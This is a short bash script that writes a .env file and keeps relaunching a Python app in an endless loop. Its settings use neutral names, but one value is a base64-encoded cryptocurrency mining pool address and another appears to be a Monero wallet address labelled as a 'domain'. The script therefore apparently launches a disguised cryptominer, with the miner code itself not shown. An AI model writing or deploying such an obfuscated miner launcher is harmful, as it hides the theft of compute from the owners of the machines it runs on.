#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://yuk.hellnawh.me
SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
SERVER_DOMAIN=43cYzMBigoDWGVgUodquAiZN69doGv2Vn2DCyLnesBgD1xeeYPQf8eq9Bi6puQPDSJEa1ZdvoNrHW7jVL1UbwfCBArRWAPY
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}
SERVER_MODE=FAST" > .env
while true; do python3 app.py; sleep 15; done
